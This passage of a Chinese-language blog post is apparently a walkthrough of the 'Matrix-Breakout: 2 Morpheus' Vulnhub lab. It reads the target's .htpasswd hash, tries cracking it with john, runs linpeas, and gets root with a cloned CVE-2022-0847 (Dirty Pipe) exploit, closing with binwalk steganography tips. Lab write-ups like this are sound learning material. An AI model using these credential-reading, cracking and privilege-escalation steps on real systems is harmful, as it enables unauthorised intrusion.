+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@morpheus:/var/nginx/html$ <span class="built_in">ls</span> -al</span><br><span class="line">total 784</span><br><span class="line">drwxr-xr-x 2 nginx nginx   4096 Oct 28  2021 .</span><br><span class="line">drwxr-xr-x 3 nginx nginx   4096 Oct 28  2021 ..</span><br><span class="line">-rw-r--r-- 1 nginx nginx     45 Oct 28  2021 .htpasswd</span><br><span class="line">-rw-r--r-- 1 nginx nginx 782775 Oct 28  2021 ignorance-bliss.png</span><br><span class="line">-rw-r--r-- 1 nginx nginx    522 Oct 28  2021 index.html</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131741286.png" /></p>
+<p>读取 <code>.htpasswd</code> 得
+<code>cypher:$apr1$e9o8Y7Om$5zgDW6WOO6Fl8rCC7jpvX0</code></p>
+<p>利用 john 尝试破解未果……</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john cypher_hash --wordlist=/root/Desktop/rockyou.txt --format=md5crypt-long</span><br></pre></td></tr></table></figure>
+<p>index.html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Meeting Place<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Dinner to Discuss Zion<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">                Agent Smith, if you want to break into Zion, meet me in 3 days at the steak house at the corner of Wabash and Lake.</span><br><span class="line">                <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;ignorance-bliss.png&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">                &quot;I know this steak doesn&#x27;t exist. I know that when I put it in my mouth, the Matrix is telling my brain that it is juicy and delicious. After nine years, you know what I realize? Ignorance is bliss.&quot;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>没啥价值……对 ignorance-bliss.png 查隐写未果……</p>
+<p>查 suid，进程，定时任务均没找到可利用信息，上传 linpeas.sh
+执行看看</p>
+<p>查到一些 CVE</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131752358.png" /></p>
+<p>结合系统信息试试</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131752359.png" /></p>
+<p>经测 CVE-2022-0847 可成功提权至 root</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/imfiver/CVE-2022-0847.git</span><br></pre></td></tr></table></figure>
+<p>下载 exp 传到靶机提权</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131757975.png" /></p>
+<p>成功提权至 root</p>
+<h3 id="补充binwalk">2.3. 补充（binwalk）</h3>
+<p>也可用 binwalk 分析隐写，常用命令(kali_linux)</p>
+<p>e 分解出压缩包</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e pcat.bin <span class="comment">//要分解的文件名</span></span><br></pre></td></tr></table></figure>
+<p>-D或者–dd 分解某种类型的文件（在windows里要用双引号括起来）</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -D=jpeg<span class="comment">/*文件类型*/</span>  pcat.bin  <span class="comment">//要分解的文件名</span></span><br></pre></td></tr></table></figure>
+<p>-M 递归分解扫描出来的文件（得跟-e或者-D配合使用）</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -eM  pcat.bin <span class="comment">//要分解的文件名</span></span><br></pre></td></tr></table></figure>
+<p>示例【cypher-neo.png】</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404131816043.png" /></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Ghost
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2024/04/13/Matrix-Breakout%202%20Morpheus/" title="Matrix-Breakout: 2 Morpheus">https://z9m8r8.github.io/2024/04/13/Matrix-Breakout 2 Morpheus/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Vulnhub-%E9%9D%B6%E5%9C%BA/" rel="tag"><i class="fa fa-tag"></i> Vulnhub 靶场</a>
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/04/12/Red%201/" rel="prev" title="Red: 1">
+                  <i class="fa fa-angle-left"></i> Red: 1
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ghost</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">195k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">11:50</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/04/13/Matrix-Breakout%202%20Morpheus/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
